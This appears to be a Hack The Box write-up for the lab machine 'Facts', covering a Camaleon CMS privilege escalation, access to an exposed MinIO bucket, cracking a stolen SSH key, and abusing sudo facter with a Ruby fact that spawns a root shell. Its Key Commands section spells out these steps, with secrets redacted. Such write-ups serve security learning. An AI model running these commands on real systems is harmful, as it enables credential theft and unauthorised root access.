---
title: HTB Facts
slug: facts
lang: en
platform: Hack The Box
category: Linux Web Exploitation
headline: Camaleon CMS privilege escalation, MinIO object exposure and sudo facter abuse
difficulty: Retired
objective: Root / Administrator
date: 2026-02-21
tags: [Linux, Camaleon CMS, MinIO, SSH Key, facter]
---

# HTB Facts

## Executive Summary

Facts exposes a Camaleon CMS instance and a MinIO service. A CMS vulnerability is used to elevate a self-registered account to administrator, which exposes object-storage credentials.

## Initial Access

After authenticating to MinIO with the recovered access material, the `internal` bucket reveals an encrypted SSH private key. The key is downloaded, converted with `ssh2john`, cracked, and used for SSH access.

## Privilege Escalation

`sudo -l` shows that `facter` can be executed with elevated privileges. A custom Ruby fact executes `/bin/sh`, and passing its directory through `--custom-dir` spawns a root shell.

## Publishing Note

The public writeup intentionally redacts object-storage secrets and private-key material. The exploitation chain is preserved without publishing reusable secret blobs.

## Key Commands

```bash
feroxbuster -u http://facts.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,js,html -t 50
```

```bash
mc alias set facts http://facts.htb:54321 <redacted-minio-access> <redacted-minio-value>
```

```bash
mc ls facts/
```

```bash
mc get facts/internal/.ssh/id_ed25519 id_rsa
```

```bash
python2 /usr/lib/john/ssh2john.py id_rsa > id.hash
```

```bash
echo 'exec "/bin/sh"' > /tmp/piv/a.rb
```

```bash
sudo /usr/bin/facter --custom-dir=/tmp/piv
```

## Evidence Trail

The following screenshots preserve the original lab evidence sequence from the Obsidian notes.

![[Pasted image 20260221183912.png|facts evidence 01]]

![[Pasted image 20260221184225.png|facts evidence 02]]

![[Pasted image 20260221184444.png|facts evidence 03]]

![[Pasted image 20260221185924.png|facts evidence 04]]

![[Pasted image 20260221190258.png|facts evidence 05]]

![[Pasted image 20260221190536.png|facts evidence 06]]

![[Pasted image 20260221200657.png|facts evidence 07]]

![[Pasted image 20260221205003.png|facts evidence 08]]

![[Pasted image 20260222023708.png|facts evidence 09]]

![[Pasted image 20260222023838.png|facts evidence 10]]

![[Pasted image 20260222024000.png|facts evidence 11]]

![[Pasted image 20260222024302.png|facts evidence 12]]

![[Pasted image 20260222024514.png|facts evidence 13]]

![[Pasted image 20260222025715.png|facts evidence 14]]

![[Pasted image 20260222051704.png|facts evidence 15]]

![[Pasted image 20260222051948.png|facts evidence 16]]

![[Pasted image 20260222052146.png|facts evidence 17]]

![[Pasted image 20260222052333.png|facts evidence 18]]

![[Pasted image 20260222052448.png|facts evidence 19]]

![[Pasted image 20260222053015.png|facts evidence 20]]

![[Pasted image 20260222053300.png|facts evidence 21]]
